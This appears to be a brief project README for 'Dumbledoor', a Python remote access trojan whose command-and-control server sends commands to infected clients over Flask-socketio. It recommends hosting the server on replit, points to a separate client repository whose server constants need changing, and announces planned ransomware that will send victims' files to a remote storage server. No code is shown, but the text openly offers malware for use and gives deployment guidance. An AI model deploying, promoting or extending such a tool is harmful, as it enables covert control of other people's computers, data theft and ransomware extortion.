RAT c2c server

Dumbledoor is a RAT written in python. It uses Flask-socketio to communicate to connected clients and give them commands. This project was created as a better vesrion of Dobby. 

I suggest hosting the server on replit, because it is free and easy to set up. Remember to change the MAIN_SERVER and STORAGE_SERVER constants in the client code, which can be found here: https://github.com/p0syd0n/snape .

The STORAGE_SERVER constant will be used to send files to a remote server when ransomware is added in a later version.

"Curiosity is not a sin.... But we should exercise caution with our curiosity... yes, indeed."- Dumbledoor
